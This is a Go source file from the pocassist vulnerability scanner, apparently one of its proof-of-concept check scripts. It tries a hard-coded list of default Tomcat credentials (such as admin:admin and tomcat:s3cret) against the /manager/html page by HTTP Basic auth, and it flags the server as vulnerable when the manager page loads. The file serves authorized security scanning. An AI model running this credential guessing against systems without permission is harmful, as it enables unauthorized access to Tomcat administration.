package scripts

import (
	"bytes"
	"encoding/base64"
	"github.com/jweny/pocassist/pkg/cel/proto"
	"github.com/jweny/pocassist/pkg/util"
	"github.com/valyala/fasthttp"
)

// tomcat 弱口令
func TomcatWeakPass(args *ScriptScanArgs) (*util.ScanResult, error) {
	// 定义报文列表
	var respList []*proto.Response

	fastReq := fasthttp.AcquireRequest()
	defer fasthttp.ReleaseRequest(fastReq)

	var rawurl = ConstructUrl(args, "/")
	var fl = []string{"Application Manager", "Welcome to Tomcat"}
	var wl = []string{"admin:admin", "tomcat:tomcat", "admin:123456", "admin:", "root:root",
		"root:", "tomcat:", "tomcat:s3cret"}
	var buf bytes.Buffer
	buf.WriteString(rawurl)
	buf.WriteString("/manager/html")
	loginurl := buf.String()

	fastReq.SetRequestURI(loginurl)
	fastReq.Header.SetMethod(fasthttp.MethodGet)

	for _, value := range wl {
		authValue := "Basic " + base64.StdEncoding.EncodeToString([]byte(value))
		fastReq.Header.Set("Authorization", authValue)

		resp, err := util.DoFasthttpRequest(fastReq, true)
		if err != nil {
			return nil, err
		}
		if resp.Status == 401 || resp.Status == 403 {
			util.ResponsePut(resp)
			continue
		}

		if resp.Status == 404 {
			util.ResponsePut(resp)
			return &util.InVulnerableResult, nil
		}
		for _, flag := range fl {
			if bytes.Contains(resp.Body, []byte(flag)) {
				respList = append(respList, resp)
				return util.VulnerableHttpResult(loginurl,"user:pass is"+value, respList), nil
			}
		}
		util.ResponsePut(resp)
	}

	return &util.InVulnerableResult, nil
}

func init() {
	ScriptRegister("poc-go-tomcat-weak-pass", TomcatWeakPass)
}
